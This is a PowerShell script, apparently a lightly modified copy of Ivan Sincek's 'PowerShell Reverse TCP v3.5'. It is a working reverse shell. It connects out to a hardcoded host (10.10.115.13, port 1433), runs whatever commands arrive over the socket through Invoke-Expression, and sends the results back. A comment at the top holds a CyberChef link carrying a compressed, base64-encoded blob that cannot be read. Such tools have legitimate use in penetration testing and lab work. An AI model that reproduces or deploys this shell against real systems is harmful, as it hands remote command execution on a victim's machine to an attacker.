# https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=dFZWcGJ4TXhFUDJjU3YwUFZocWhSTEFtNmNWUmdWVFNnMHE5MUVTY1FzaTdtU1NtanIxNHZXbEx5WC9IMTE1SktFVVVKOXBqNXMyYmVmYll1N2IyTUtPK3M3cXloaDVrM00xMUxxNUE5c2JBR0xxQUtjZ0VVTDk3anFZYmVPdXZ1UlpIZUlPT3BvU2pIdVVSWFA0YjExM0RjeDFTOVRZTmtZUllKRlFKZVlPSVFpT3F4bW1JSXpGNVNuVXRRV0pyZVJvYjRZa1JIa2duUEZCUmpIT3VBd0NHaGhJQUtZRUdnaE1GS0tRcUVwUWIxczRiK2Vsa3UvL3M4TVhGNmZOcFNFSSsvSkJ1bm13Zng2TWY2dnYyeDg0bS9pOGFIMm9ZTXZOclJJd0NWK2dWYXZDVU1XMXRKRW9DbVpRdFlUb2NnaXhicmlSVlZjdUFLRkorbDVDa3JNeXI5SExjcnE0WUtRMGFhMGU5MDhibTM5bkNuWTI2OThSQ21xRE81c2JHNmtxdHFPNFVyb0t6OEJ0RVNqOHEzQlBSSmFnRTk2TzRheUZOemZuRWhiZDJUR1Nod25IZ1ExQTlhMnM2UUM2cVJQM21Sc0huTDZqVFh0KzBHT0NSR0ZBK3FxTDZjSzN3YmhKUnV1LzlGcHpQU1FsNmRJWmQwdmZXMmZSbHRVb0JlRGRWNG9DbHlkZ1VxMlFLcmp4ZFNxSXRiZk0yRUdicWFubUlaV3ZXejN1djY1WXFCeFJ4UGhPK0FESm9lckZQVUZ2UGtYdkd4OEJIYXV6Q2EzU0ltajQwR0NuVWJubTZXcjZ1OXY0WTVWUGk1MU0vemJFYkVzODZNOWNadWhwVEJpalRqdmMwMCs2VVVFWkNCZzc1dS9TVjdMZ3ZxVjg4SDJHdFRzZGMyYjdaYWxaQzNvcEhmQ291SWRpL2pyVXBvWUtqb0NzbUU4SUhYdC82NjBjZDlCT2RwU3B3Mmx3eXJTRWlLaG92b1d4OHhmdlhFY1RLc0MyTGRMY3VBeUtEZDBSU0l4b0ZwMlFDcUc1eTFqMnd3WndPVGVuSXZURHZ0bnJaTXFsNms0alU3cEcyeHhiZHNCQUk4OHVQYmxIUk1oWFhEcG9oWVBwN1VFYXd6SlhSVnpzeUt6MUp3OFQzaGkwdTc0dldUaDdvcW43OHlyc0tSMWJzdktkb3BNbzhaTzdsVSt3S3FsZFd3N1dsdmhTTTVkN1QyUEo2VjVZWUgzRU9zbmc5MFgxRVJtQkRocFFUeGx6ZjJWbjNCMExBd1IyQ3Jlb203aktSZ08vbnpMWkhrN2l3THBma29GYlNMRXZsVDd1RlZIN0xWVkpsMi9BZXFSeTBtc29meVF1cC9ERmJTZVZ0OTBubG9OVlUvb2hlU09YNzFCTGRTZXFBVlZLL2RlZEovOWcrT1lFOUtlNFhubTl3RS95NWQ1TW9tT0REN3BlWEw3dUNNZjJCc05YUGZnRT0

########################################################################";
#                                                                      #";
#                        PowerShell Reverse TCP v3.5                   #";
#                                          by Ivan Sincek              #";
#                                                                      #";
# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
#                                                                      #";
#########################################################################";


$client = $null;
$stream = $null;
$buffer = $null;
$writer = $null;
$data = $null;
$result = $null;
try {
    $ip = "10.10.115.13"
    $port = 1433
	$client = New-Object Net.Sockets.TcpClient($ip, $port);
	$stream = $client.GetStream();
	$buffer = New-Object Byte[] 1024;
	$encoding = New-Object Text.AsciiEncoding;
	$writer = New-Object IO.StreamWriter($stream);
	$writer.AutoFlush = $true;
	$bytes = 0;
	do {
		$writer.Write("PS>");
		do {
			$bytes = $stream.Read($buffer, 0, $buffer.Length);
			if ($bytes -gt 0) {
				$data = $data + $encoding.GetString($buffer, 0, $bytes);
			}
		} while ($stream.DataAvailable);
		if ($bytes -gt 0) {
			$data = $data.Trim();
			if ($data.Length -gt 0) {
				try {
					$result = Invoke-Expression -Command $data 2>&1 | Out-String;
				} catch {
					$result = $_.Exception | Out-String;
				}
				Clear-Variable -Name "data";
				$length = $result.Length;
				if ($length -gt 0) {
					$count = 0;
					do {
						if ($length -ge $buffer.Length) { $bytes = $buffer.Length; } else { $bytes = $length; }
						$writer.Write($result.substring($count, $bytes));
						$count += $bytes;
						$length -= $bytes;
					} while ($length -gt 0);
					Clear-Variable -Name "result";
				}
			}
		}
	} while ($bytes -gt 0);
} catch {
	 $_.Exception.InnerException.Message;
} finally {
	if ($writer -ne $null) {
		$writer.Close();
		$writer.Dispose();
		Clear-Variable -Name "writer";
	}
	if ($stream -ne $null) {
		$stream.Close();
		$stream.Dispose();
		Clear-Variable -Name "stream";
	}
	if ($client -ne $null) {
		$client.Close();
		$client.Dispose();
		Clear-Variable -Name "client";
	}
	if ($buffer -ne $null) {
		$buffer.Clear();
		Clear-Variable -Name "buffer";
	}
	if ($result -ne $null) {
		Clear-Variable -Name "result";
	}
	if ($data -ne $null) {
		Clear-Variable -Name "data";
	}
	[System.GC]::Collect();
}